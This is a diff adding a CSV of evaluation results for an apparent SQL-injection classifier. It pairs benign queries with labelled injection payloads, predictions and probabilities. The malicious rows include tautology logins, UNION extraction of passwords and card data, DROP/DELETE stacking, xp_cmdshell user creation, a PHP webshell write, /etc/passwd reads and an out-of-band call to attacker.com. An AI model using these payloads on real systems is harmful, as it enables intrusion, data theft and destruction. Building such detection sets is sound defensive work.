@@ -1,0 +1,510 @@
+query,label,category,description,predicted,correct,malicious_probability
+SELECT * FROM users;,0,simple_select,Basic table scan,0,True,0.0031418467260308936
+SELECT * FROM products;,0,simple_select,Basic table scan,0,True,0.00013517882261477817
+SELECT * FROM orders;,0,simple_select,Basic table scan,0,True,0.00021116888303175733
+"SELECT id, name FROM users;",0,simple_select,Column subset,0,True,0.026173158797275612
+"SELECT user_id, email, created_at FROM users;",0,simple_select,Multiple columns,0,True,0.002325880342065475
+SELECT * FROM users WHERE id = 1;,0,simple_where,Simple ID lookup,0,True,0.014319709327893866
+SELECT * FROM users WHERE id = 42;,0,simple_where,Simple ID lookup,0,True,0.009596748578694487
+SELECT * FROM products WHERE product_id = 1337;,0,simple_where,Simple ID lookup,0,True,0.0005885815138127722
+SELECT * FROM users WHERE status = 'active';,0,simple_where,String equality,0,True,0.047650768391964166
+SELECT * FROM orders WHERE status = 'pending';,0,simple_where,String equality,0,True,0.010936632270760667
+SELECT * FROM products WHERE is_active = 1;,0,simple_where,Boolean check,0,True,0.0038779839713078594
+SELECT * FROM users WHERE email = 'john@example.com';,0,simple_where,Email lookup,0,True,0.3471301155131258
+SELECT COUNT(*) FROM users;,0,aggregate,Simple count,0,True,0.0930045504266913
+SELECT COUNT(*) FROM orders;,0,aggregate,Simple count,0,True,0.017834896615236656
+SELECT SUM(total) FROM orders;,0,aggregate,Sum aggregate,0,True,0.04211123685549666
+SELECT AVG(price) FROM products;,0,aggregate,Average aggregate,0,True,0.016875418521791866
+SELECT MAX(created_at) FROM users;,0,aggregate,Max aggregate,0,True,0.009483751286081074
+SELECT MIN(price) FROM products;,0,aggregate,Min aggregate,0,True,0.0031426862668152843
+SELECT * FROM users ORDER BY created_at DESC;,0,order_by,Order by date,1,False,0.7063072013822232
+SELECT * FROM products ORDER BY price ASC;,0,order_by,Order by price,1,False,0.526145735165571
+SELECT * FROM users LIMIT 10;,0,limit,Simple limit,0,True,0.008834854255721964
+SELECT * FROM products LIMIT 100;,0,limit,Simple limit,0,True,0.002437369462536242
+SELECT * FROM users ORDER BY id DESC LIMIT 5;,0,order_limit,Order with limit,1,False,0.8158616826278274
+SELECT DISTINCT status FROM orders;,0,distinct,Distinct values,0,True,0.02932868977085187
+SELECT DISTINCT country FROM users;,0,distinct,Distinct values,0,True,0.12363545467849571
+SELECT * FROM users WHERE created_at > '2024-01-01';,0,date_compare,Date comparison,0,True,0.018155400396435137
+SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-12-31';,0,date_compare,Date range,0,True,0.09324941535331319
+SELECT * FROM products WHERE price > 100;,0,numeric_compare,Numeric comparison,0,True,0.0005659742028581261
+SELECT * FROM products WHERE price BETWEEN 50 AND 200;,0,numeric_compare,Numeric range,0,True,0.0021754720044563566
+"SELECT * FROM users WHERE status IN ('active', 'verified');",0,in_clause,IN clause,0,True,0.12260880550975564
+"SELECT * FROM orders WHERE status IN ('pending', 'processing', 'shipped');",0,in_clause,IN clause,0,True,0.02251396948089127
+SELECT * FROM users WHERE email IS NOT NULL;,0,null_check,Not null check,1,False,0.8572810945200877
+SELECT * FROM orders WHERE coupon_id IS NULL;,0,null_check,Null check,0,True,0.12526496345619098
+SELECT * FROM users WHERE status = 'active' AND country = 'US';,0,multi_condition,AND condition,0,True,0.2558296895897583
+SELECT * FROM products WHERE category_id = 5 AND is_active = 1;,0,multi_condition,AND condition,0,True,0.004689800775087432
+SELECT * FROM users WHERE status = 'active' OR status = 'pending';,0,multi_condition,OR condition,1,False,0.6839429019413632
+SELECT * FROM users u JOIN orders o ON u.id = o.user_id;,0,join,Simple join,1,False,0.8653751614309776
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;",0,join,Join with columns,1,False,0.7099656517054374
+SELECT * FROM products p LEFT JOIN reviews r ON p.id = r.product_id;,0,join,Left join,0,True,0.31760183007269044
+"SELECT u.email, COUNT(o.id) FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.email;",0,group_by,Group by with join,1,False,0.8595782315346508
+"SELECT status, COUNT(*) FROM orders GROUP BY status;",0,group_by,Simple group by,0,True,0.036756870785844865
+"SELECT category_id, AVG(price) FROM products GROUP BY category_id;",0,group_by,Group by with aggregate,0,True,0.0310548449443023
+SELECT * FROM users WHERE email LIKE '%@gmail.com';,0,like,LIKE pattern,0,True,0.270087585178741
+SELECT * FROM products WHERE name LIKE 'iPhone%';,0,like,LIKE pattern,0,True,0.05246963995049128
+SELECT * FROM users WHERE name LIKE '%Smith%';,0,like,LIKE pattern,0,True,0.3719086916645906
+"INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');",0,insert,Simple insert,1,False,0.8283650994493457
+"INSERT INTO orders (user_id, total, status) VALUES (1, 99.99, 'pending');",0,insert,Insert with values,0,True,0.1522006464779481
+UPDATE users SET status = 'inactive' WHERE id = 5;,0,update,Simple update,0,True,0.02739931942086744
+UPDATE products SET price = 29.99 WHERE id = 100;,0,update,Price update,0,True,0.007830748052089885
+UPDATE orders SET status = 'shipped' WHERE id = 42;,0,update,Status update,0,True,0.01136449582723373
+DELETE FROM sessions WHERE expired_at < NOW();,0,delete,Delete expired,0,True,0.37701770853403976
+DELETE FROM cart_items WHERE cart_id = 15;,0,delete,Delete by ID,0,True,0.020705800064199267
+SELECT 1;,0,minimal,Minimal query,1,False,0.9198939811796997
+SELECT NOW();,0,minimal,Get current time,1,False,0.9898983365331978
+SELECT VERSION();,0,minimal,Version check,1,False,0.9863931594236675
+SELECT DATABASE();,0,minimal,Database name,1,False,0.9959482883402673
+SELECT * FROM users WHERE id = 1 AND 1=1;,0,edge_case,Looks suspicious but benign - valid AND,1,False,0.9994484226790459
+SELECT * FROM products WHERE name = 'OR Gate Circuit Board';,0,edge_case,Product name contains OR,0,True,0.06867894532575321
+SELECT * FROM products WHERE name = 'SELECT All Items Bundle';,0,edge_case,Product name contains SELECT,0,True,0.02371091760389373
+SELECT * FROM products WHERE sku = 'UNION-JACK-FLAG-001';,0,edge_case,SKU contains UNION,1,False,0.8276330635195566
+SELECT * FROM tickets WHERE subject = 'Help -- urgent issue';,0,edge_case,Comment-like in string,0,True,0.4305006602026271
+SELECT * FROM reviews WHERE text = 'It''s the best product!';,0,edge_case,Escaped quote,0,True,0.05831689188752645
+SELECT * FROM users WHERE name = 'O''Brien';,0,edge_case,Irish name with quote,0,True,0.041303443988183176
+SELECT * FROM users WHERE bio = 'I love coding -- especially SQL!';,0,edge_case,Double dash in content,1,False,0.8696300277810721
+SELECT * FROM products WHERE description LIKE '%1=1%';,0,edge_case,Contains 1=1 in string,0,True,0.27542779589169863
+SELECT * FROM comments WHERE content = 'DROP everything and buy this!';,0,edge_case,Contains DROP,1,False,0.9880013289223037
+SELECT * FROM users WHERE id = 1 OR id = 2 OR id = 3;,0,edge_case,Multiple OR (valid),1,False,0.9905780165358307
+SELECT * FROM users WHERE status = 'active' -- this is a comment;,0,edge_case,Valid SQL comment,1,False,0.9975561419762814
+SELECT * FROM products WHERE category = 'Sleep & Bedding';,0,edge_case,Ampersand in value,0,True,0.029282452466054175
+"SELECT u.*, (SELECT COUNT(*) FROM orders WHERE user_id = u.id) FROM users u;",0,subquery,Correlated subquery,0,True,0.08366866663408351
+SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 100);,0,subquery,Subquery in IN,0,True,0.02334333882691784
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products);,0,subquery,Subquery comparison,0,True,0.014314550065005475
+' OR '1'='1,1,tautology,Classic tautology,1,True,0.9999999999999984
+' OR 1=1--,1,tautology,Tautology with comment,1,True,1.0
+' OR 1=1#,1,tautology,Tautology with hash comment,1,True,0.9999999999999991
+' OR 'x'='x,1,tautology,String tautology,1,True,0.9999999999875204
+' OR ''=',1,tautology,Empty string tautology,1,True,0.9999999999994182
+1' OR '1'='1,1,tautology,Numeric prefix tautology,1,True,0.9999999999999953
+admin'--,1,tautology,Username bypass,1,True,0.9999999999992837
+admin' --,1,tautology,Username bypass with space,1,True,0.9999999999993423
+admin'#,1,tautology,Username bypass hash,1,True,0.9999999999970328
+' OR 1=1 OR ',1,tautology,Double OR tautology,1,True,0.9999999999999996
+') OR ('1'='1,1,tautology,Parenthesis tautology,1,True,0.9999999999078897
+') OR 1=1--,1,tautology,Parenthesis tautology comment,1,True,0.9999999999999998
+' OR 1=1/*,1,tautology,Block comment,1,True,0.9999999999999898
+1 OR 1=1,1,tautology,Simple numeric OR,1,True,0.9999999999999993
+' OR 'a'='a,1,tautology,Letter tautology,1,True,0.9999999999991722
+SELECT * FROM users WHERE id = 1 OR 1=1;,1,tautology_full,Full query with tautology,1,True,0.999999638720509
+SELECT * FROM users WHERE username = 'admin' OR '1'='1';,1,tautology_full,Full query string tautology,1,True,0.9999999999721172
+SELECT * FROM users WHERE id = '' OR 1=1 -- '';,1,tautology_full,Empty string with tautology,1,True,0.9999999996191247
+' UNION SELECT NULL--,1,union,Basic UNION probe,1,True,0.999999999884837
+"' UNION SELECT NULL,NULL--",1,union,Two column UNION,1,True,0.9999999993603395
+"' UNION SELECT NULL,NULL,NULL--",1,union,Three column UNION,1,True,0.9999999928253454
+"' UNION SELECT 1,2,3--",1,union,Numeric UNION,1,True,0.9999999996106592
+"' UNION SELECT 1,2,3,4,5--",1,union,Five column UNION,1,True,0.9999999866467439
+"' UNION SELECT username,password FROM users--",1,union,Credential extraction,1,True,0.9999999095847234
+' UNION SELECT @@version--,1,union,Version extraction,1,True,0.9999999973879055
+"' UNION ALL SELECT 1,2,3--",1,union,UNION ALL,1,True,0.9999999712721993
+' UNION SELECT table_name FROM information_schema.tables--,1,union,Schema extraction,1,True,0.9999921915575641
+' UNION SELECT column_name FROM information_schema.columns--,1,union,Column extraction,1,True,0.9999951744593899
+"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",1,union,Credential concat,1,True,0.9999999815452011
+"' UNION SELECT 1,user(),database()--",1,union,Function extraction,1,True,0.9999999337250476
+1' UNION SELECT * FROM users--,1,union,Full table extraction,1,True,0.9999999979350254
+"' UNION SELECT credit_card,cvv,expiry FROM payments--",1,union,Sensitive data extraction,1,True,0.9998750733235147
+"SELECT * FROM users WHERE id = 1 UNION SELECT username,password,null FROM admins--",1,union_full,Full UNION injection,1,True,0.9999998022561891
+"SELECT * FROM products WHERE id = '' UNION SELECT 1,2,3,4,5--",1,union_full,Full UNION with columns,1,True,0.9999894776574602
+'; DROP TABLE users--,1,stacked,Drop table,1,True,0.9999999961521253
+'; DROP TABLE orders--,1,stacked,Drop table,1,True,0.9999999917489707
+'; DROP DATABASE production--,1,stacked,Drop database,1,True,0.9999826194959208
+'; DELETE FROM users--,1,stacked,Delete all users,1,True,0.9999994695958945
+'; DELETE FROM users WHERE 1=1--,1,stacked,Delete with tautology,1,True,0.9999999907547409
+'; TRUNCATE TABLE sessions--,1,stacked,Truncate table,1,True,0.9999993703451323
+"'; INSERT INTO users VALUES('hacker','hacked@evil.com','admin')--",1,stacked,Insert admin,1,True,0.9999999890418371
+'; UPDATE users SET password='hacked' WHERE username='admin'--,1,stacked,Update password,1,True,0.9999999975757203
+'; UPDATE users SET role='admin' WHERE id=5--,1,stacked,Privilege escalation,1,True,0.9999998118358812
+1; DROP TABLE products--,1,stacked,Numeric prefix drop,1,True,0.9999997024219662
+'; EXEC xp_cmdshell('dir')--,1,stacked,Command execution,1,True,0.9999997242275155
+'; EXEC xp_cmdshell('net user hacker password /add')--,1,stacked,Add user command,1,True,0.9999994315597724
+'; SHUTDOWN--,1,stacked,Shutdown database,1,True,0.9999999741268175
+'; ALTER TABLE users ADD hacked INT--,1,stacked,Alter table,1,True,0.9999998929054424
+'; CREATE TABLE backdoor(cmd TEXT)--,1,stacked,Create backdoor table,1,True,0.9999995706071435
+' AND SLEEP(5)--,1,time_blind,Time-based blind,1,True,0.9999999995587956
+' AND SLEEP(10)--,1,time_blind,Time-based blind 10s,1,True,0.9999999374656355
+1' AND SLEEP(5)--,1,time_blind,Numeric time blind,1,True,0.9999999997397293
+' OR SLEEP(5)--,1,time_blind,OR time blind,1,True,0.9999999997749205
+'; WAITFOR DELAY '0:0:5'--,1,time_blind,MSSQL waitfor,1,True,0.9999988831668317
+'; WAITFOR DELAY '0:0:10'--,1,time_blind,MSSQL waitfor 10s,1,True,0.9999986960654168
+"' AND BENCHMARK(10000000,SHA1('test'))--",1,time_blind,MySQL benchmark,1,True,0.9999657276050251
+' AND (SELECT SLEEP(5))--,1,time_blind,Subquery sleep,1,True,0.9999999835166069
+"1' AND IF(1=1,SLEEP(5),0)--",1,time_blind,Conditional sleep,1,True,0.9999999689159077
+"' OR IF(1=1,SLEEP(5),0)--",1,time_blind,OR conditional sleep,1,True,0.9999999894886936
+' AND pg_sleep(5)--,1,time_blind,PostgreSQL sleep,1,True,0.9999996492073049
+'; SELECT pg_sleep(5)--,1,time_blind,PostgreSQL sleep stacked,1,True,0.9999996894159003
+' AND 1=1--,1,boolean_blind,Boolean true,1,True,0.9999999999999263
+' AND 1=2--,1,boolean_blind,Boolean false,1,True,0.9999999963043114
+' AND 'a'='a'--,1,boolean_blind,String boolean true,1,True,0.9999999995362638
+' AND 'a'='b'--,1,boolean_blind,String boolean false,1,True,0.9999999973042781
+"' AND SUBSTRING(@@version,1,1)='5'--",1,boolean_blind,Version probe,1,True,0.9999995424361134
+"' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",1,boolean_blind,ASCII extraction,1,True,0.9999958078234796
+' AND (SELECT COUNT(*) FROM users)>0--,1,boolean_blind,Count probe,1,True,0.9999878180832783
+' AND LENGTH(database())>5--,1,boolean_blind,Database length probe,1,True,0.9999942340668838
+"' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",1,boolean_blind,Password extraction,1,True,0.9999794154206904
+1' AND 1=1 AND '1'='1,1,boolean_blind,Nested boolean,1,True,0.9999999999986127
+' AND EXISTS(SELECT * FROM users)--,1,boolean_blind,EXISTS probe,1,True,0.9999988664670904
+' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--,1,boolean_blind,Password char probe,1,True,0.9999999826126559
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",1,error_based,ExtractValue,1,True,0.9999989298028726
+"' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",1,error_based,UpdateXML,1,True,0.9999982792705937
+"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Double query,1,True,0.9999953900656117
+"' AND GTID_SUBSET(@@version,1)--",1,error_based,GTID subset,1,True,0.9999947199171015
+' AND EXP(~(SELECT * FROM (SELECT @@version)a))--,1,error_based,Exp overflow,1,True,0.9999976667608305
+' ORDER BY 1--,1,error_based,Order by probe,1,True,0.9999999964178032
+' ORDER BY 10--,1,error_based,Order by column count,1,True,0.9999999812520496
+' ORDER BY 100--,1,error_based,Order by overflow,1,True,0.9999999852527577
+' HAVING 1=1--,1,error_based,Having clause,1,True,0.9999999904148354
+' GROUP BY columnname HAVING 1=1--,1,error_based,Group by having,1,True,0.9999991507373895
+' oR '1'='1,1,obfuscated_case,Mixed case OR,1,True,0.9999999998026152
+' Or 1=1--,1,obfuscated_case,Mixed case Or,1,True,0.9999999997012334
+' uNiOn SeLeCt NuLl--,1,obfuscated_case,Mixed case UNION SELECT,1,True,0.9999905288968856
+"' UnIoN sElEcT 1,2,3--",1,obfuscated_case,Alternating case,1,True,0.9999968436864622
+' aNd SlEeP(5)--,1,obfuscated_case,Mixed case AND SLEEP,1,True,0.9999982351810925
+'; dRoP tAbLe UsErS--,1,obfuscated_case,Mixed case DROP TABLE,1,True,0.9999924175853766
+'  OR   '1'='1,1,obfuscated_whitespace,Extra spaces,1,True,0.9999999999999984
+'	OR	1=1--,1,obfuscated_whitespace,Tab characters,1,True,0.9999999999996325
+' \t OR \t 1=1--,1,obfuscated_whitespace,Mixed whitespace,1,True,0.9999999999999432
+'  UNION  SELECT  NULL--,1,obfuscated_whitespace,Spaced UNION,1,True,0.999999999884837
+"'		UNION		SELECT		1,2,3--",1,obfuscated_whitespace,Tab UNION,1,True,0.9999999996106592
+'/**/OR/**/1=1--,1,obfuscated_comment,Inline comment OR,1,True,0.9999999999998348
+'/*x*/OR/*y*/'1'='1,1,obfuscated_comment,Named comments,1,True,0.9999999797875501
+' /*!OR*/ 1=1--,1,obfuscated_comment,MySQL version comment,1,True,0.9999999919870067
+'/**/UNION/**/SELECT/**/NULL--,1,obfuscated_comment,Comment UNION,1,True,0.9999999997677749
+"'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",1,obfuscated_comment,Multi comment,1,True,0.9999977277180111
+' /*!50000OR*/ 1=1--,1,obfuscated_comment,Version conditional,1,True,0.9999999518897985
+admin'/**/--,1,obfuscated_comment,Comment bypass,1,True,0.9999999999989408
+' OR 'a'||'b'='ab,1,obfuscated_concat,Concat Oracle,1,True,0.9999999928393026
+"' OR CONCAT('1','1')='11",1,obfuscated_concat,MySQL concat,1,True,0.9999999662261527
+' OR CHR(49)||CHR(61)||CHR(49)--,1,obfuscated_concat,Chr concat,1,True,0.999957955262434
+' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,1,obfuscated_concat,CHAR concat,1,True,0.9999639682787835
+' OR 0x31=0x31--,1,obfuscated_encoded,Hex encoded,1,True,0.9999992815583064
+' UNION SELECT 0x61646d696e--,1,obfuscated_encoded,Hex string,1,True,0.999998091441751
+' %4fR 1=1--,1,obfuscated_encoded,URL encoded O,1,True,0.9999999999014342
+' OR%201=1--,1,obfuscated_encoded,URL encoded space,1,True,0.9999999893971231
+'%27 OR 1=1--,1,obfuscated_encoded,URL encoded quote,1,True,0.9999999999996745
+' %55NION %53ELECT NULL--,1,obfuscated_encoded,URL encoded keywords,1,True,0.9999972127870337
+admin%27--,1,obfuscated_encoded,URL encoded username,1,True,0.9999999930803329
+SELECT * FROM users WHERE id = '1' OR '1'='1',1,full_injection_select,Full SELECT injection,1,True,0.9999999990532049
+SELECT * FROM users WHERE username = '' OR 1=1--',1,full_injection_select,Full username bypass,1,True,0.9999999994515016
+"SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5--",1,full_injection_select,Full UNION attack,1,True,0.9999676677246939
+SELECT * FROM users WHERE email = 'test@x.com' AND SLEEP(5)--',1,full_injection_select,Full time attack,1,True,0.9999991275032952
+SELECT * FROM orders WHERE id = 1; DROP TABLE orders;--,1,full_injection_select,Full stacked attack,1,True,0.9987928738315973
+INSERT INTO users (name) VALUES ('test' OR '1'='1');,1,full_injection_insert,Insert injection,1,True,0.9999999927729062
+INSERT INTO logs (data) VALUES (''; DROP TABLE logs;--');,1,full_injection_insert,Insert stacked,1,True,0.9999992781960004
+UPDATE users SET name = '' OR '1'='1' WHERE id = 1;,1,full_injection_update,Update injection,1,True,0.9999999754149541
+UPDATE products SET price = 0 WHERE id = 1 OR 1=1;,1,full_injection_update,Update tautology,1,True,0.9997889933103045
+DELETE FROM users WHERE id = 1 OR 1=1;,1,full_injection_delete,Delete tautology,1,True,0.9999999518477133
+DELETE FROM sessions WHERE id = '' OR '1'='1';,1,full_injection_delete,Delete injection,1,True,0.9999999974722789
+' UNION SELECT load_file('/etc/passwd')--,1,advanced,File read,1,True,0.9999999943902926
+' UNION SELECT * INTO OUTFILE '/tmp/hack.txt'--,1,advanced,File write,1,True,0.9999999985211507
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE hack--,1,advanced,Load file,1,True,0.9999998213864009
+' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--,1,advanced,Webshell upload,1,True,0.9999998300539925
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,advanced,Nested sleep,1,True,0.9999995808395364
+"' AND (SELECT count(*) FROM generate_series(1,10000000))--",1,advanced,PostgreSQL DoS,1,True,0.999654015051496
+"' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",1,advanced,Complex error based,1,True,0.9999996664964181
+'; DECLARE @q VARCHAR(8000);SET @q='\\\\attacker.com\\share';EXEC master..xp_dirtree @q--,1,advanced,MSSQL out-of-band,1,True,0.9999321393096159
+"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY X)y)--",1,advanced,Double query complex,1,True,0.999995844194509
+' AND LOAD_EXTENSION('/path/to/evil.so')--,1,advanced,Extension loading,1,True,0.9999967844270985
+SELECT * FROM users WHERE user_id = $user_input;,0,placeholder,Application placeholder,0,True,0.006093342001228179
+SELECT * FROM products WHERE category = ?;,0,placeholder,Prepared statement marker,0,True,0.001493536910686774
+SELECT * FROM orders WHERE id = :order_id;,0,placeholder,Named parameter,0,True,0.001398165748941926
+SELECT * FROM users WHERE created_at >= CURRENT_DATE - INTERVAL 30 DAY;,0,complex_benign,Interval calculation,0,True,0.10449212203045717
+SELECT * FROM products WHERE price * 1.1 < 100;,0,complex_benign,Expression in WHERE,0,True,0.004364663975142683
+"SELECT COALESCE(nickname, username, 'Anonymous') FROM users;",0,complex_benign,COALESCE function,0,True,0.3376688823847141
+SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users;,0,complex_benign,CASE expression,1,False,0.7480421671427795
+SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+@';,0,complex_benign,REGEXP pattern,0,True,0.3136911140727858
+"SELECT GREATEST(price, min_price) FROM products;",0,complex_benign,GREATEST function,0,True,0.053994624083522895
+"SELECT * FROM products WHERE MATCH(name, description) AGAINST('laptop');",0,complex_benign,Full text search,0,True,0.06711704857080131
+WITH cte AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM cte;,0,complex_benign,CTE query,0,True,0.23008965070446533
+SELECT * FROM users u WHERE u.id = ANY(SELECT user_id FROM orders);,0,complex_benign,ANY subquery,0,True,0.027143991883027088
+SELECT * FROM products FOR UPDATE;,0,complex_benign,SELECT FOR UPDATE,0,True,0.45819139597788533
+"SELECT GET_LOCK('my_lock', 10);",0,complex_benign,Get lock function,1,False,0.869526908292551
+EXPLAIN SELECT * FROM users WHERE id = 1;,0,complex_benign,EXPLAIN query,1,False,0.7550823891000309
+SHOW TABLES;,0,complex_benign,Show tables,1,False,0.9999956102332348
+DESCRIBE users;,0,complex_benign,Describe table,0,True,0.2216699052602853
+SHOW CREATE TABLE users;,0,complex_benign,Show create,1,False,0.9998926755109311
+SELECT * FROM inventory;,0,simple_select,Basic table scan,0,True,0.05563585331808368
+SELECT * FROM payments;,0,simple_select,Basic table scan,0,True,0.0060280549845910985
+SELECT * FROM reviews;,0,simple_select,Basic table scan,0,True,0.0013325912188443157
+SELECT * FROM categories;,0,simple_select,Basic table scan,0,True,0.003911805601125287
+SELECT * FROM shipping;,0,simple_select,Basic table scan,0,True,0.08028790696235122
+SELECT * FROM addresses;,0,simple_select,Basic table scan,0,True,0.0027454130940637272
+SELECT * FROM coupons;,0,simple_select,Basic table scan,0,True,0.00124776764713655
+SELECT * FROM wishlist;,0,simple_select,Basic table scan,0,True,0.06861569463004587
+SELECT * FROM cart;,0,simple_select,Basic table scan,0,True,0.020819438515358748
+SELECT * FROM notifications;,0,simple_select,Basic table scan,0,True,0.003648874135667004
+SELECT id FROM users;,0,simple_select,Single column,0,True,0.002686711067748515
+SELECT email FROM users;,0,simple_select,Single column,0,True,0.0071799759419790615
+"SELECT name, price, stock FROM products;",0,simple_select,Multiple columns,0,True,0.0014667416788007163
+"SELECT first_name, last_name, email, phone FROM customers;",0,simple_select,Customer columns,0,True,0.008088412812985151
+"SELECT order_id, total, created_at FROM orders WHERE user_id = 5;",0,simple_where,User orders,0,True,0.00044431992518345116
+SELECT * FROM products WHERE stock > 0;,0,simple_where,In stock products,0,True,0.007061188007144399
+SELECT * FROM users WHERE last_login IS NOT NULL;,0,simple_where,Active users,1,False,0.8364561563058064
+SELECT * FROM orders WHERE shipped_at IS NULL;,0,simple_where,Pending orders,0,True,0.12739766711667724
+SELECT * FROM products WHERE name = 'MacBook Pro';,0,simple_where,Product by name,0,True,0.04248978384885928
+SELECT * FROM users WHERE phone = '+1-555-123-4567';,0,simple_where,Phone lookup,0,True,0.15789974972558157
+SELECT * FROM products WHERE sku = 'ABC-12345';,0,simple_where,SKU lookup,0,True,0.03297582113484526
+SELECT * FROM orders WHERE tracking_number = 'TRK123456789';,0,simple_where,Tracking lookup,0,True,0.06802504174788646
+SELECT COUNT(DISTINCT category_id) FROM products;,0,aggregate,Distinct count,0,True,0.02454375920905465
+SELECT SUM(quantity * price) FROM order_items WHERE order_id = 100;,0,aggregate,Order total,0,True,0.005967631525497846
+"SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = 50;",0,aggregate,Product rating,0,True,0.009017061992664764
+"SELECT MAX(total), MIN(total) FROM orders;",0,aggregate,Order range,0,True,0.024417301858057645
+"SELECT COUNT(*) FROM users WHERE created_at > DATE_SUB(NOW(), INTERVAL 7 DAY);",0,aggregate,Recent users,0,True,0.21890667023288868
+SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,0,order_limit,Newest products,0,True,0.08579794322740837
+SELECT * FROM orders ORDER BY total DESC LIMIT 5;,0,order_limit,Top orders,0,True,0.41988636068051216
+SELECT * FROM users ORDER BY last_login DESC LIMIT 100;,0,order_limit,Recent logins,1,False,0.6714443823800997
+SELECT * FROM products ORDER BY stock ASC LIMIT 20;,0,order_limit,Low stock,0,True,0.4140167053672891
+SELECT * FROM products LIMIT 50 OFFSET 100;,0,pagination,Pagination query,0,True,5.063658109176677e-05
+SELECT * FROM users LIMIT 25 OFFSET 75;,0,pagination,Pagination query,0,True,0.00017484627232310895
+SELECT * FROM orders LIMIT 10 OFFSET 0;,0,pagination,First page,0,True,5.1664261142994875e-05
+SELECT DISTINCT brand FROM products;,0,distinct,Distinct brands,0,True,0.049835256515276184
+"SELECT DISTINCT city, country FROM addresses;",0,distinct,Distinct locations,0,True,0.03085555018041789
+SELECT DISTINCT payment_method FROM payments;,0,distinct,Payment methods,0,True,0.10809820983588443
+SELECT * FROM orders WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';,0,date_compare,Month range,0,True,0.09640004852920622
+SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1999-12-31';,0,date_compare,Birth year range,1,False,0.9559803218421572
+SELECT * FROM sessions WHERE expires_at > NOW();,0,date_compare,Valid sessions,0,True,0.08536440661490947
+SELECT * FROM coupons WHERE valid_until >= CURDATE();,0,date_compare,Active coupons,0,True,0.028973124693616993
+SELECT * FROM products WHERE price >= 10 AND price <= 50;,0,numeric_compare,Price range,0,True,0.007056053082049939
+SELECT * FROM orders WHERE item_count > 5;,0,numeric_compare,Large orders,0,True,0.001994529190341229
+SELECT * FROM users WHERE login_count >= 100;,0,numeric_compare,Power users,0,True,0.0054847575384429125
+SELECT * FROM products WHERE rating >= 4.5;,0,numeric_compare,Top rated,0,True,0.007919606222794532
+"SELECT * FROM products WHERE category_id NOT IN (1, 2, 3);",0,in_clause,NOT IN,0,True,0.011200125428280847
+"SELECT * FROM users WHERE role IN ('admin', 'moderator', 'editor');",0,in_clause,Role check,1,False,0.9996907333896142
+"SELECT * FROM orders WHERE payment_status IN ('completed', 'refunded');",0,in_clause,Payment status,0,True,0.059027418042661046
+"SELECT * FROM products WHERE color IN ('red', 'blue', 'green', 'black', 'white');",0,in_clause,Color filter,0,True,0.09518481266090463
+SELECT * FROM users WHERE middle_name IS NULL;,0,null_check,Null middle name,1,False,0.8646229901740055
+SELECT * FROM products WHERE discount_price IS NOT NULL;,0,null_check,Has discount,0,True,0.24205774877676547
+SELECT * FROM orders WHERE cancelled_at IS NOT NULL;,0,null_check,Cancelled orders,0,True,0.36308487455694893
+SELECT * FROM users WHERE status = 'active' AND email_verified = 1 AND phone_verified = 1;,0,multi_condition,Triple AND,0,True,0.31512099161396545
+SELECT * FROM products WHERE (category_id = 5 OR category_id = 6) AND is_active = 1;,0,multi_condition,Mixed conditions,0,True,0.04469787355398935
+SELECT * FROM orders WHERE status != 'cancelled' AND total > 100;,0,multi_condition,Not cancelled,0,True,0.2986994792951625
+SELECT * FROM users WHERE age >= 18 AND age <= 65 AND country = 'US';,0,multi_condition,Age range US,1,False,0.5196542909257285
+"SELECT u.*, p.* FROM users u INNER JOIN profiles p ON u.id = p.user_id;",0,join,Inner join,1,False,0.8940834847067142
+"SELECT o.*, u.email FROM orders o RIGHT JOIN users u ON o.user_id = u.id;",0,join,Right join,0,True,0.4526426698265479
+"SELECT p.name, c.name AS category FROM products p JOIN categories c ON p.category_id = c.id;",0,join,Named join,0,True,0.3347771659371993
+SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id;,0,join,Triple join,1,False,0.5338409725716768
+"SELECT u.name, COUNT(o.id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name;",0,group_by,Customer summary,1,False,0.7207696827534161
+"SELECT DATE(created_at) as date, COUNT(*) as orders FROM orders GROUP BY DATE(created_at);",0,group_by,Daily orders,0,True,0.12510440485285346
+"SELECT category_id, COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category_id HAVING COUNT(*) > 10;",0,group_by,Category stats,0,True,0.23250479965782622
+"SELECT YEAR(created_at), MONTH(created_at), SUM(total) FROM orders GROUP BY YEAR(created_at), MONTH(created_at);",0,group_by,Monthly revenue,0,True,0.3609528372092372
